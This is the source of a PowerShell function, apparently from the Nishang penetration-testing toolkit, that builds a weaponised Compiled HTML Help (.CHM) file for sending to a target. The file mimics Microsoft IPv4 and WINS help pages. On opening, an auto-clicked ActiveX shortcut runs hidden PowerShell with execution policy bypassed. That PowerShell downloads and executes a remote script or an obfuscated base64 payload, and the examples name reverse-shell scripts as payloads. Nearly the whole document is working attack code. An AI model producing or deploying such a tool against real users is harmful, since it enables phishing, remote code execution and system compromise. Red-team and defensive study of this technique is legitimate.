
function Out-CHM
{

<#
.SYNOPSIS
Nishang script useful for creating Compiled HTML Help file (.CHM) which could be used to run PowerShell commands and scripts.

.DESCRIPTION
The script generates a CHM file which needs to be sent to a target.
You must have hhc.exe (HTML Help Workshop) on your machine to use this script.
HTML Help Workshop is a free Microsoft Tool and could be downloaded from below link:
http://www.microsoft.com/en-us/download/details.aspx?id=21138

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the PowerShell script which would be executed on the target.

.PARAMETER PayloadScript
Path to a PowerShell script on local machine.
Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself.  

.PARAMETER Arguments
Arguments to the PowerShell script to be executed on the target.

.PARAMETER HHCPath
Path to the HTML Help Workshop on the attacker's machine.

.PARAMETER OutputPath
Path to the directory where the files would be saved. Default is the current directory.

.EXAMPLE
PS > Out-CHM -Payload "Get-Process" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Above command would execute Get-Process on the target machine when the CHM file is opened.


.EXAMPLE
PS > Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
you must pass the parameters in the script itself. 


.EXAMPLE
PS > Out-CHM -PayloadURL http://192.168.254.1/Get-Information.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to generate CHM file which download and execute the given PowerShell script in memory on target.

.EXAMPLE
PS > Out-CHM -Payload "-EncodedCommand <>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to generate CHM file which executes the encoded command/script.
Use Invoke-Encode from Nishang to encode the command or script.

.EXAMPLE
PS > Out-CHM -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Use above command to pass an argument to the PowerShell script/module.

.EXAMPLE
PS > Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1

Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
you must pass the parameters in the script itself.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang

.Notes
Based on the work mentioned in this tweet by @ithurricanept
https://twitter.com/ithurricanept/status/534993743196090368
#>



    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $PayloadScript,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 4, Mandatory = $True)]
        [String]
        $HHCPath,

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $OutputPath="$pwd"
    )

    #Check if the payload has been provided by the user
    if(!$Payload)
    {
        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }    

    if($PayloadScript)
    {
        #Logic to read, compress and Base64 encode the payload script.
        $Enc = Get-Content $PayloadScript -Encoding Ascii
    
        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $Enc | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
    
        # Base64 encode stream
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
    
        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +

        "`$(New-Object IO.Compression.DeflateStream (" +

        "`$(New-Object IO.MemoryStream (,"+

        "`$([Convert]::FromBase64String('$Compressed')))), " +

        "[IO.Compression.CompressionMode]::Decompress)),"+

        " [Text.Encoding]::ASCII)).ReadToEnd();"

        #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
        if ($EncScript.Length -gt 8100)
        {
            Write-Warning "Payload too big for CHM! Try a smaller payload."
            break
        }
        else
        {
            $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
        }
    }

    #Create the table of contents for the CHM
    $CHMTableOfContents = @"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Advanced IP Settings Tab">
      <param name="Local" value="doc.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Advanced WINS Tab">
      <param name="Local" value="doc1.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Alternate Configuration Tab">
      <param name="Local" value="doc.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 and IPv6 Advanced DNS Tab">
      <param name="Local" value="doc1.htm">
  </OBJECT>
  </UL>
</BODY>
</HTML>
"@

    #Create the Project file for the CHM
    $CHMProject = @"
[OPTIONS]
Contents file=$OutputPath\doc.hhc
[FILES]
$OutputPath\doc.htm
$OutputPath\doc1.htm
"@
    #Create the HTM files, the first one controls the payload execution.
    $CHMHTML1 = @"
<HTML>
<TITLE>Check for Windows updates from Command Line</TITLE>
<HEAD>
</HEAD>
<BODY>

<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",cmd.exe,/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile $Payload">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>

<SCRIPT>
x.Click();
</SCRIPT>

<html DIR="LTR" xmlns:MSHelp="http://msdn.microsoft.com/mshelp" xmlns:ddue="http://ddue.schemas.microsoft.com/authoring/2003/5" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:tool="http://www.microsoft.com/tooltip"><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Windows-1252"></META><META NAME="save" CONTENT="history"></META><title>IPv4 Advanced IP Settings Tab</title><link rel="stylesheet" type="text/css" href="../local/Classic.css"></link><script src="../local/script.js"></script></head><body><div id="header"><h1>IPv4 Advanced IP Settings Tab</h1></div><div id="mainSection"><div id="mainBody"><p class="runningHeader"></p>
<p>You can use the settings on this tab for this network connection only if you are not using the <b>Obtain an IP address automatically</b> on the <b>General</b> tab.</p>

<p><b>IP addresses</b> lists additional Internet Protocol version 4 (IPv4) addresses that can be assigned to this network connection. There is no limit to the number of IP addresses that can be configured. This setting is useful if this computer connects to a single physical network but requires advanced IP addressing because of either of the following reasons:</p>

<ul><li class="unordered">
A single logical IP network is in use and this computer needs to use more than one IP address to communicate on that network.<br /><br />
</li><li class="unordered">
Multiple logical IP networks are in use and this computer needs a different IP address to communicate with each of the different logical IP networks.<br /><br />
</li></ul>

<p><b>Default gateways</b> lists IP addresses for additional default gateways that can be used by this network connection. A default gateway is a local IP router that is used to forward packets to destinations beyond the local network. </p>

<p><b>Automatic metric</b> specifies whether TCP/IP automatically calculates a value for an interface metric that is based on the speed of the interface. The highest-speed interface has the lowest interface metric value. </p>

<p><b>Interface metric</b> provides a location for you to type a value for the interface metric for this network connection. A lower value for the interface metric indicates a higher priority for use of this interface. </p>
<h1 class="heading">Procedures</h1><div id="sectionSection0" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure additional IP addresses for this connection</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">In <b>IP Addresses</b>, click <b>Add</b>.<b> </b></p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Type an IP address in <b>IP address</b>. </p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Type a subnet mask in <b>Subnet mask</b>, and then click <b>Add</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Repeat steps 1 through 3 for each IP address you want to add, and then click <b>OK</b>.</p>
</content></li></ol></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure additional default gateways for this connection</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">On the <b>IP Settings</b> tab, in <b>Default gateways</b>, click <b>Add</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">In <b>TCP/IP Gateway Address</b>, type the IP address of the default gateway in <b>Gateway</b>. To manually configure a default route metric, clear the <b>Automatic metric </b>check box and type a metric in <b>Metric</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Click <b>Add</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Repeat steps 1 through 3 for each default gateway you want to add, and then click <b>OK</b>.</p>
</content></li></ol></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure a custom metric for this connection</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Clear the <b>Automatic metric</b> check box, and then type a metric value in <b>Interface metric</b>.</p>
</content></li></ul></ddue:steps>
</content></div><h1 class="heading">Additional references</h1><div id="sectionSection1" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">For updated detailed IT pro information about TCP/IP versions 4 and 6, see <a href="http://go.microsoft.com/fwlink/?LinkID=117437" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=117437</linkText></a> and <a href="http://go.microsoft.com/fwlink/?LinkID=71543" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=71543</linkText></a>.</p>
</content></div></div><hr /><p /></div></body></html>
</BODY>
</HTML>
"@
    #Second help topic to make the file look authentic.
    $CHMHTML2 = @"
<html DIR="LTR" xmlns:MSHelp="http://msdn.microsoft.com/mshelp" xmlns:ddue="http://ddue.schemas.microsoft.com/authoring/2003/5" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:tool="http://www.microsoft.com/tooltip"><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Windows-1252"></META><META NAME="save" CONTENT="history"></META><title>IPv4 Advanced WINS Tab</title><link rel="stylesheet" type="text/css" href="../local/Classic.css"></link><script src="../local/script.js"></script></head><body><div id="header"><h1>IPv4 Advanced WINS Tab</h1></div><div id="mainSection"><div id="mainBody"><p class="runningHeader"></p>
<p>You can use the settings on this tab for this network connection only if you are not using the <b>Obtain an IP address automatically</b> on the <b>General</b> tab.</p>

<p><b>WINS addresses, in order of use</b> lists the Windows Internet Name Service (WINS) servers that TCP/IP queries to resolve network basic input/output system (NetBIOS) names. WINS servers are queried in the order in which they are listed here.</p>

<p><b>Enable LMHOSTS lookup</b> specifies whether an Lmhosts file is used to resolve the NetBIOS names of remote computers to an IP address. </p>

<p>Click <b>Import LMHOSTS</b> to import a file into the Lmhosts file. The Lmhosts file is located in the %SystemRoot%\System32\Drivers\Etc folder on a Windows-based computer. There is also a sample Lmhosts file (Lmhosts.sam) in this folder. When you import LMHOSTS from a file, the original Lmhosts file is not appended to, but is overwritten by the new file.</p>

<p><b>NetBIOS setting</b> specifies whether this network connection obtains the setting to enable or disable NetBIOS over TCP/IP (NetBT) from a Dynamic Host Configuration Protocol (DHCP) server. </p>

<p>When an IP address is automatically obtained, the <b>Default</b> option is selected so that this computer uses the NetBT setting as optionally provided by the DHCP server when this computer obtains an IP address and configuration lease. If the Disable NetBIOS over TCP/IP (NetBT) DHCP option is provided by the DHCP server, the value of the option determines whether NetBT is enabled or disabled. If the Disable NetBIOS over TCP/IP (NetBT) DHCP option is not provided by the DHCP server, NetBT is enabled.</p>

<p>If you are manually configuring an IP address, selecting <b>Enable NetBIOS over TCP/IP</b> enables NetBT. This option is not available for dial-up connections.</p>
<h1 class="heading">Procedures</h1><div id="sectionSection0" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure advanced WINS properties</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">In <b>WINS addresses, in order of use</b>, click <b>Add</b>, type the address of the WINS server, and then click <b>Add</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Repeat step 1 for each WINS server IP address you want to add, and then click <b>OK</b>.</p>
</content></li></ol></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To enable the use of the Lmhosts file to resolve remote NetBIOS names</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Select the <b>Enable LMHOSTS lookup</b> check box. This option is enabled by default.</p>
</content></li></ul></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To specify the location of the file that you want to import into the Lmhosts file</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">Click <b>Import LMHOSTS</b>, and then select the file in the <b>Open</b> dialog box.</p>
</content></li></ul></ddue:steps>

<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To enable or disable NetBIOS over TCP/IP</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">To enable the use of NetBIOS over TCP/IP, click <b>Enable NetBIOS over TCP/IP</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">To disable the use of NetBIOS over TCP/IP, click <b>Disable NetBIOS over TCP/IP</b>.</p>
</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">To have the DHCP server determine whether NetBIOS over TCP/IP is enabled or disabled, click <b>Default</b>.</p>
</content></li></ul></ddue:steps>
</content></div><h1 class="heading">Additional references</h1><div id="sectionSection1" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
<p xmlns="">For updated detailed IT pro information about TCP/IP versions 4 and 6, see <a href="http://go.microsoft.com/fwlink/?LinkID=117437" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=117437</linkText></a> and <a href="http://go.microsoft.com/fwlink/?LinkID=71543" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=71543</linkText></a>.</p>
</content></div></div><hr /><p /></div></body></html>

"@

    #Write all files to disk for compilation
    Out-File -InputObject $CHMTableOfContents -FilePath "$OutputPath\doc.hhc" -Encoding default
    Out-File -InputObject $CHMHTML1 -FilePath "$OutputPath\doc.htm" -Encoding default
    Out-File -InputObject $CHMHTML2 -FilePath "$OutputPath\doc1.htm" -Encoding default
    Out-File -InputObject $CHMProject -FilePath "$OutputPath\doc.hhp" -Encoding default
    
    #Compile the CHM, only this needs to be sent to a target.
    $HHC = "$HHCPath" + "\hhc.exe"
    & "$HHC" "$OutputPath\doc.hhp"

    #Cleanup
    Remove-Item "$OutputPath\doc.hhc"
    Remove-Item "$OutputPath\doc.htm"
    Remove-Item "$OutputPath\doc1.htm"
    Remove-Item "$OutputPath\doc.hhp"
    
}

